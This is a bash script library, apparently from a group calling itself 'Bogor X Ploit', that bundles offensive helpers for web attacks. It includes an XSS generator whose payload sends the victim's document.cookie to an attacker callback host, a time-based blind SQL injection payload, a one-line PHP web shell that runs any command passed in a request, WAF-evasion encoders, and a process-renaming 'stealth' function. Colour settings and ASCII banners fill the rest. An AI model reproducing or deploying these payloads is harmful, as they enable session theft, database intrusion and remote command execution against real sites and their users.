#!/usr/bin/env bash
# ============================================
#   BXP CORE LIBRARY v1.0
#   Engine: Native Core (No External Wrapper)
#   By Bogor X Ploit
# ============================================

# --- 1. UI & Colors ---
export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'

# --- 2. Network Engine (Native HTTP Request) ---
bxp_http_request() {
    local url="$1"
    local payload="$2"
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/1.0"
    local response_time
    response_time=$(curl -s -A "$user_agent" -o /dev/null -w "%{time_total}" "${url}${payload}")
    echo "$response_time"
}

# --- 3. Encoder Engine (Anti WAF) ---
bxp_encode_b64() { echo -n "$1" | base64 -w 0; }
bxp_encode_hex() { echo -n "$1" | xxd -p | tr -d '\n'; }
bxp_encode_url() { python3 -c "import urllib.parse; print(urllib.parse.quote('''$1'''))" 2>/dev/null || echo "$1"; }

# --- 4. Payload Engine (Generator) ---
bxp_gen_xss() {
    local callback="$1"
    echo "<script>new Image().src='http://${callback}:2010/?c='+document.cookie;</script>"
}

bxp_gen_sqli() {
    local sleep_time="$1"
    echo "1' AND (SELECT 1 FROM (SELECT SLEEP(${sleep_time}))a)-- -"
}

bxp_gen_php_shell() {
    echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"
}

# --- 5. Stealth Engine (Hiding) ---
bxp_hide_process() {
    local new_name="$1"
    if command -v exec >/dev/null; then
        exec -a "$new_name" bash
    fi
}

# --- 6. System Engine (Device Check) ---
bxp_check_root() {
    if [ "$(id -u)" -eq 0 ]; then echo "Root"; else echo "Non-Root"; fi
}

# --- 7. ASCII Title Engine ---
bxp_ascii_title() {
    local title="$1"
    if [ "$title" = "NYCTOPHOBIA" ]; then
        echo -e "${C}"
        cat <<'ASCII'
 _   _ __   __ _____ _____ ___  _____  _   _  ____ _____ ___  
| \ | |\ \ / /| ____|_   _/ _ \|  _ \| | | |/ __ \_   _/ _ \ 
|  \| | \ V / |  _|   | || | | | |_) | |_| | |  | || || | | |
| |\  |  | |  | |___  | || |_| |  __/|  _  | |__| || || |_| |
|_| \_|  |_|  |_____| |_| \___/|_|   |_| |_|\____/|_| \___/ 
ASCII
        echo -e "${N}"
    elif [ "$title" = "SLEEP PARALYSIS" ]; then
        echo -e "${R}"
        cat <<'ASCII'
 ____  _     _____ _____ ____    ____   _    ____  _     __   ___   __ _____ 
/ ___|| |   | ____| ____|  _ \  |  _ \ / \  |  _ \| |    \ \ / / | | |_   _|
\___ \| |   |  _| |  _| | |_) | | |_) / _ \ | |_) | |     \ V /| | | | | |  
 ___) | |___| |___| |___|  __/  |  __/ ___ \|  _ <| |___   | | | |_| | | |  
|____/|_____|_____|_____|_|     |_| /_/   \_\_| \_\_____|  |_|  \___/  |_|  
ASCII
        echo -e "${N}"
    elif [ "$title" = "NOCTURNAL DECAY" ]; then
        echo -e "${Y}"
        cat <<'ASCII'
 _   _  ___   ____ _______ _   _ ____  _        ____  _____ ____   _    __   __
| \ | |/ _ \ / ___|__   __| | | |  _ \| |      |  _ \| ____/ ___| / \   \ \ / /
|  \| | | | | |      | |  | | | | |_) | |      | | | |  _|| |    / _ \   \ V / 
| |\  | |_| | |___   | |  | |_| |  _ <| |___   | |_| | |__| |___/ ___ \   | |  
|_| \_|\___/ \____|  |_|   \___/|_| \_\_____|  |____/|_____\____/_/   \_\  |_|  
ASCII
        echo -e "${N}"
    fi
}
